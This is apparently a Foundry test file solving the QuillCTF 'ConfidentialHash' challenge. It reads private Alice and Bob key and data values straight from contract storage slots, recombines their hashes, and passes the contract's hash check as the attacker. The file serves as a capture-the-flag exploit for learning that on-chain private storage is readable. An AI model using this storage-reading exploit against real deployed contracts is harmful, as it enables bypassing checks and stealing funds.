// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/ConfidentialHash.sol";

contract ConfidentialHashTest is Test {
    ConfidentialHash public confidentialHash;
    address public deployer;
    address public attacker;

    bytes32 ALICE_PRIVATE_KEY;
    bytes32 ALICE_DATA;
    bytes32 BOB_PRIVATE_KEY;
    bytes32 BOB_DATA;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);

        vm.startPrank(deployer);
        confidentialHash = new ConfidentialHash();
        vm.stopPrank();

        // Get the private variables by storage slot order
        ALICE_PRIVATE_KEY = vm.load(address(confidentialHash), bytes32(uint256(2)));
        ALICE_DATA = vm.load(address(confidentialHash), bytes32(uint256(3)));
        BOB_PRIVATE_KEY = vm.load(address(confidentialHash), bytes32(uint256(7)));
        BOB_DATA = vm.load(address(confidentialHash), bytes32(uint256(8)));

        // Check all values of private variable
        console.logBytes32(ALICE_PRIVATE_KEY);
        console.logBytes32(ALICE_DATA);
        console.logBytes32(BOB_PRIVATE_KEY);
        console.logBytes32(BOB_DATA);
    }

    function testConfidentialHashExploit() public {
        // Before exploit
        bytes32 hashExploit;
        vm.expectRevert("Hashes do not match.");
        bool prevFlag = confidentialHash.checkthehash(hashExploit);
        assertEq(prevFlag, false);

        // Exploit
        vm.startPrank(attacker);
        bytes32 aliceHash = confidentialHash.hash(ALICE_PRIVATE_KEY, ALICE_DATA);
        bytes32 bobHash = confidentialHash.hash(BOB_PRIVATE_KEY, BOB_DATA);
        hashExploit = confidentialHash.hash(aliceHash, bobHash);
        bool flag = confidentialHash.checkthehash(hashExploit);
        assertEq(flag, true);
        vm.stopPrank();
    }
}